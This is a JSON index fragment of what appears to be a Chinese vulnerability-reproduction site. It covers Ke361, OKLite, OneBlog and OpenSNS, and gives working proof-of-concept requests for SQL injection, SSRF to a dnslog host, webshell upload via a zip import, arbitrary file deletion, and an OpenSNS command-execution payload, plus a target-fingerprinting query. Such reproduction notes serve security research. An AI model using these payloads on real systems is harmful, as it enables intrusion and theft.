","date":"0001-01-01","objectID":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:0:0","tags":null,"title":"","uri":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"漏洞描述 Ke361 DistrictController.class.php index() 函数 pid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:1:0","tags":null,"title":"","uri":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"漏洞影响 Ke361 ","date":"0001-01-01","objectID":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:2:0","tags":null,"title":"","uri":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"环境搭建 https://gitee.com/jcove/ke361 ","date":"0001-01-01","objectID":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:3:0","tags":null,"title":"","uri":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 Application/Admin/Controller/DistrictController.class.php 验证POC admin.php?s=/District/index/pid/1)%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+ ","date":"0001-01-01","objectID":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:4:0","tags":null,"title":"","uri":"/ke361-districtcontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"Ke361 GoodsController.class.php SSRF漏洞 ","date":"0001-01-01","objectID":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Ke361 GoodsController.class.php URL参数存在 SSRF漏洞，通过漏洞可以获取敏感信息 ","date":"0001-01-01","objectID":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Ke361 ","date":"0001-01-01","objectID":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://gitee.com/jcove/ke361 ","date":"0001-01-01","objectID":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 Application/Home/Controller/GoodsController.class.php URL参数无任何过滤，传入 file_get_contents函数，造成SSRF漏洞，构造请求 POST /index.php?s=/Goods/ajGetGoodsDetial url=http://6si2gt.dnslog.cn dnslog接收到请求 ","date":"0001-01-01","objectID":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/ke361-goodscontroller.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Ke361 MenuController.class.php 后台SQL注入漏洞 CNVD-2021-25002 ","date":"0001-01-01","objectID":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:0:0","tags":null,"title":"","uri":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"漏洞描述 Ke361 MenuController.class.php文件 index() 函数中的pid参数存在 SQL注入漏，导致攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:1:0","tags":null,"title":"","uri":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"漏洞影响 Ke361 ","date":"0001-01-01","objectID":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:2:0","tags":null,"title":"","uri":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"环境搭建 https://gitee.com/jcove/ke361 ","date":"0001-01-01","objectID":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:3:0","tags":null,"title":"","uri":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 Application/Admin/Controller/MenuController.class.php Get 传参 pid 传入SQL语句 SELECT `id`,`title`,`pid`,`sort`,`url`,`hide`,`tip`,`group`,`is_dev`,`status` FROM `ke_menu` WHERE (id=1) 使用括号闭合语句，构造SQL注入 /admin.php?s=/Menu/index/pid/1)%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+ ","date":"0001-01-01","objectID":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/:4:0","tags":null,"title":"","uri":"/ke361-menucontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-25002/"},{"categories":null,"content":"Ke361 TopicController.class.php SQL注入漏洞 CNVD-2017-04380 ","date":"0001-01-01","objectID":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/:0:0","tags":null,"title":"","uri":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/"},{"categories":null,"content":"漏洞描述 Ke361 TopicController.class.php 文件中 detai() 函数中存在 SQL注入漏洞 ","date":"0001-01-01","objectID":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/:1:0","tags":null,"title":"","uri":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/"},{"categories":null,"content":"漏洞影响 Ke361 ","date":"0001-01-01","objectID":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/:2:0","tags":null,"title":"","uri":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/"},{"categories":null,"content":"环境搭建 https://gitee.com/jcove/ke361 ","date":"0001-01-01","objectID":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/:3:0","tags":null,"title":"","uri":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 Application/Home/Controller/TopicController.class.php, 漏洞函数详情 public function detail(){ $id = I('id'); $where['tid'] = $id; $TopicModel = new TopicModel(); $topicInfo = $TopicModel-\u003einfo($id); // if(empty($topicInfo)){ // $this-\u003eerror('您查看的专题不存在哦！'); // } // 这里注释掉，默认不存在专题 M('Topic')-\u003ewhere('id='.$id)-\u003esetInc('hits'); $this-\u003esetSiteTitle($topicInfo['title']); $goods = $this-\u003elists(D('Goods'),$where); foreach ($goods as $k=\u003e$v){ $goods[$k]['url'] = U('/goods/'.$v['id']); } $this-\u003eassign('goods',$goods); $this-\u003eassign('topic',$topicInfo); $this-\u003edisplay(); } 这里接收参数 id，然后执行SQL语句, 通过报错注入可以获取数据库数据 /index.php?s=/Topic/detail/id/1)%20%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+ ","date":"0001-01-01","objectID":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/:4:0","tags":null,"title":"","uri":"/ke361-topiccontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2017-04380/"},{"categories":null,"content":"OKLite 1.2.25 后台插件安装 任意文件上传 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞描述 OKLite v1.2.25 后台插件过滤不完善导致可以上传恶意木马文件 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞影响 OKLite 1.2.25 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞复现 关于执行逻辑参照上一篇 OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131 出现漏洞的位置在于framework/admin/plugin_control.php public function unzip_f() { $id = $this-\u003eget('id','int'); $rs = $this-\u003emodel('res')-\u003eget_one($id); if(!$rs){ $this-\u003ejson(P_Lang('附件不存在')); } if($rs['ext'] != 'zip'){ $this-\u003ejson(P_Lang('非ZIP文件不支持在线解压')); } if(!file_exists($this-\u003edir_root.$rs['filename'])){ $this-\u003ejson(P_Lang('文件不存在')); } $info = $this-\u003elib('phpzip')-\u003ezip_info($this-\u003edir_root.$rs['filename']); $info = current($info); if(!$info['filename']){ $this-\u003ejson(P_Lang('插件有异常')); } $info = explode('/',$info['filename']); if(!$info[0]){ $this-\u003ejson(P_Lang('插件有异常')); } if(file_exists($this-\u003edir_root.'plugins/'.$info[0])){ $this-\u003ejson(P_Lang('插件已存在，不允许重复解压')); } if(!$info[1]){ $this-\u003ejson(P_Lang('插件打包模式有问题')); } $this-\u003elib('phpzip')-\u003eunzip($this-\u003edir_root.$rs['filename'],$this-\u003edir_root.'plugins/'); $this-\u003ejson(true); } 这里可以看到需要上传ZIP压缩包格式的插件，跟进zip_info函数 函数位置 framework/libs/phpzip.php 这里会返回关于ZIP压缩包的一些信息 往下看关键位置 $info = explode('/',$info['filename']); if(!$info[0]){ $this-\u003ejson(P_Lang('插件有异常')); } if(file_exists($this-\u003edir_root.'plugins/'.$info[0])){ $this-\u003ejson(P_Lang('插件已存在，不允许重复解压')); } if(!$info[1]){ $this-\u003ejson(P_Lang('插件打包模式有问题')); } $this-\u003elib('phpzip')-\u003eunzip($this-\u003edir_root.$rs['filename'],$this-\u003edir_root.'plugins/'); $this-\u003ejson(true); 这里用 explode函数以 / 分隔返回两个值，也就是说格式应为 AAA/BBB这样的目录格式，直接上传ZIP文件则会报错 插件打包模式有问题 在这里上传一个ZIP文件，格式要是解压出来为目录，目录中含PHP文件就行了 $this-\u003elib('phpzip')-\u003eunzip($this-\u003edir_root.$rs['filename'],$this-\u003edir_root.'plugins/'); $this-\u003ejson(true); 最后两行告诉了文件解压的位置，上传的文件在 plugins目录下 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/:0:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/"},{"categories":null,"content":"漏洞描述 OKLite v1.2.25 后台模块导入过滤不完善导致可以上传恶意木马文件 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/:1:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/"},{"categories":null,"content":"漏洞影响 OKLite 1.2.25 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/:2:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/"},{"categories":null,"content":"漏洞复现 首先要先清楚它的执行流程 查看文件 framework/init.php 在往下面看可以看到执行函数的逻辑 例如 http://127.0.0.1/admin.php?c=ABC\u0026f=EFG 则是调用 framework\\admin\\ABC_control.php中的EFG_f方法 看到在后台有一个 ZIP 文件上传的函数，找一下上传ZIP文件的位置 模块管理 –\u003e 模块导入 回头看下函数方法的调用 public function zipfile($input,$folder='') { if(!$input){ return array('status'=\u003e'error','content'=\u003eP_Lang('未指定表单名称')); } //如果未指定存储文件夹，则使用 if(!$folder){ $folder = 'data/cache/'; } $this-\u003ecateid = 0; $this-\u003eset_dir($folder); $this-\u003eset_type('zip'); $this-\u003ecate = array('id'=\u003e0,'filemax'=\u003e104857600,'root'=\u003e$folder,'folder'=\u003e'/','filetypes'=\u003e'zip'); if(isset($_FILES[$input])){ $rs = $this-\u003e_upload($input); }else{ $rs = $this-\u003e_save($input); } if($rs['status'] != 'ok'){ return $rs; } $rs['cate'] = $this-\u003ecate; return $rs; } 这里的 上传目录默认为 data/cache 这个目录，并调用了两个方法 upload 和 save 可以看到这里其实对上传的zip并没有对里面的文件有什么过滤,任意上传一个ZIP文件抓包 test.php文件内容 如下，打包为 test.zip 上传 \u003c?php phpinfo();?\u003e 可以看到这里调用的方法是 upload_control中的 zip 方法 这里放包后发现调用了另一个方法，跟踪下代码 framework/admin/module_control.php 中的 import_f方法 这里的方法为解压方法，说明ZIP文件上传的逻辑为 模块上传 –\u003e ZIP文件写入 data/cache –\u003e 解压刚刚的ZIP文件到 data/cache 目录 所以这里的流程完全是没有过滤危险文件的，将一个木马文件打包为ZIP文件上传访问即可 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/:3:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-cve-2019-16131/"},{"categories":null,"content":"OKLite 1.2.25 后台风格模块 任意文件删除 CVE-2019-16132 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/:0:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/"},{"categories":null,"content":"漏洞描述 OKLite 1.2.25 后台风格模块存在 对危险字符未过滤，导致可以删除任意目录和文件 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/:1:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/"},{"categories":null,"content":"漏洞影响 OKLite 1.2.25 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/:2:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/"},{"categories":null,"content":"漏洞复现 出现漏洞的函数在文件 framework/admin/tpl_control.php 中的 delfile_f() 函数 这里删除文件主要调用了 rm函数, 位置在 framework/libs/file.php /** * 删除操作，请一定要小心，在程序中最好严格一些，不然有可能将整个目录删掉 * @参数 $del 要删除的文件或文件夹 * @参数 $type 仅支持file和folder，为file时仅删除$del文件，如果$del为文件夹，表示删除其下面的文件。为folder时，表示删除$del这个文件，如果为文件夹，表示删除此文件夹及子项 * @返回 true/false **/ public function rm($del,$type=\"file\") { if(!file_exists($del)){ return false; } if(is_file($del)){ unlink($del); return true; } $array = $this-\u003e_dir_list($del); if(!$array){ if($type == 'folder'){ rmdir($del); } return true; } foreach($array as $key=\u003e$value){ if(file_exists($value)){ if(is_dir($value)){ $this-\u003erm($value,$type); }else{ unlink($value); } } } if($type == \"folder\"){ rmdir($del); } return true; } 这里对传入的参数遍历，获得的文件名或文件夹进行删除 回过头看 调用get函数传入参数时是否有对 ../ 的过滤 可以看到参数我们是可控的，使用这里的漏洞进行任意文件删除 抓包修改成功删除文件 ","date":"0001-01-01","objectID":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/:3:0","tags":null,"title":"","uri":"/oklite-1.2.25-%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-cve-2019-16132/"},{"categories":null,"content":"OneBlog 开源博客管理系统 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/oneblog-%E5%BC%80%E6%BA%90%E5%8D%9A%E5%AE%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/oneblog-%E5%BC%80%E6%BA%90%E5%8D%9A%E5%AE%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 由于使用含有漏洞版本的Apache Shiro和默认的密钥，导致OneBlog存在远程命令执行漏洞。 ","date":"0001-01-01","objectID":"/oneblog-%E5%BC%80%E6%BA%90%E5%8D%9A%E5%AE%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/oneblog-%E5%BC%80%E6%BA%90%E5%8D%9A%E5%AE%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 shiro 默认密钥： ","date":"0001-01-01","objectID":"/oneblog-%E5%BC%80%E6%BA%90%E5%8D%9A%E5%AE%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/oneblog-%E5%BC%80%E6%BA%90%E5%8D%9A%E5%AE%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OpenSNS Application ShareController.class.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OpenSNS 存在远程命令执行漏洞，攻击者通过漏洞发送特定的请求包可以执行任意命令 ","date":"0001-01-01","objectID":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OpenSNS ","date":"0001-01-01","objectID":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1167011145\" ","date":"0001-01-01","objectID":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件 Application/Weibo/Controller/ShareController.class.php 发送Payload /index.php?s=weibo/Share/shareBox\u0026query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver) ","date":"0001-01-01","objectID":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/opensns-application-sharecontroller.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OpenSNS AuthorizeController.class.php 后台远程命令执行漏洞 ","date":"0001-01-01","objectID":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OpenSNS AuthorizeController.class.php文件 ssoCallback() 函数存在命令执行漏洞，在登录的情况下可以获取服务器权限 ","date":"0001-01-01","objectID":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OpenSNS ","date":"0001-01-01","objectID":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1167011145\" ","date":"0001-01-01","objectID":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件为 Application/Admin/Controller/AuthorizeController.class.php 其中 config参数可控，构造请求就可以通过 file_put_contents 写入执行任意命令 构造请求包 POST 